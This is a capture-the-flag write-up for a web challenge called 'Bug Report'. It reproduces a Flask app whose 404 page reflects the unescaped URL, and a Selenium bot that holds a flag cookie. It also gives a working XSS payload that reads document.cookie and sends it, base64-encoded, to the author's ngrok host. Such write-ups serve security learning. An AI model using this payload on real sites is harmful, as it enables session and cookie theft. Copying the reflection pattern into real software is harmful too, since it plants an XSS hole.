# Web - Bug Report
This challenge came with downloadable source code that showed it to be a python flask app. The contents of `challenge/app.py`:
```py
from flask import Flask, request, render_template
from urllib.parse import unquote
from bot import visit_report

app = Flask(__name__)

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/api/submit", methods=["POST"])
def submit():
    try:
        url = request.json.get("url")
        
        assert(url.startswith('http://') or url.startswith('https://'))
        visit_report(url)

        return {"success": 1, "message": "Thank you for your valuable submition!"}
    except:
        return {"failure": 1, "message": "Something went wrong."}


@app.errorhandler(404)
def page_not_found(error): 
    return "<h1>URL %s not found</h1><br/>" % unquote(request.url), 404

app.run(host="0.0.0.0", port=1337)
```
The contents of `app/bot.py`: 
```py
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait

def visit_report(url):

    options = Options()
    options.add_argument('headless')
    options.add_argument('no-sandbox')
    options.add_argument('disable-dev-shm-usage')
    options.add_argument('disable-infobars')
    options.add_argument('disable-background-networking')
    options.add_argument('disable-default-apps')
    options.add_argument('disable-extensions')
    options.add_argument('disable-gpu')
    options.add_argument('disable-sync')
    options.add_argument('disable-translate')
    options.add_argument('hide-scrollbars')
    options.add_argument('metrics-recording-only')
    options.add_argument('mute-audio')
    options.add_argument('no-first-run')
    options.add_argument('dns-prefetch-disable')
    options.add_argument('safebrowsing-disable-auto-update')
    options.add_argument('media-cache-size=1')
    options.add_argument('disk-cache-size=1')
    options.add_argument('user-agent=BugHTB/1.0')
    browser = webdriver.Chrome('chromedriver', options=options, service_args=['--verbose', '--log-path=/tmp/chromedriver.log'])

    browser.get('http://127.0.0.1:1337/')

    browser.add_cookie({
        'name': 'flag',
        'value': 'CHTB{f4k3_fl4g_f0r_t3st1ng}'
    })

    try:
        browser.get(url)
        WebDriverWait(browser, 5).until(lambda r: r.execute_script('return document.readyState') == 'complete')
    except:
        pass
    finally:
        browser.quit()
```
It looks like the main app just opens up selenium with a user provided URL, so the exploit seems to be to XSS to retrieve the cookie set in `bot.py`. 

The `app.py` is pretty short so the XSS vulnerability in the 404 page is easy to find. It passes the user provided URL directly into the returned HTML, allowing the user to inject any javascript they want. 

To exploit this, I created a payload that uses JS to read `document.cookie` and exfiltrates it to my server by creating an image with my server's URL. Here is the payload:
```html
<script>i=document.createElement('img');i.src="https://xxx.ngrok.io:xxxx/"+btoa(document.cookie);document.body.appendChild(i)</script>
```
Next, I crafted the URL`http://<instance_ip>/<urlencoded_payload>`and submitted it to the form on the homepage. I wasn't sure if the cookie was going to be HttpOnly and therefore inaccessible through `document.cookie`, but reading that variable worked fine. 

Soon, I got a request with the base64 encoded flag. 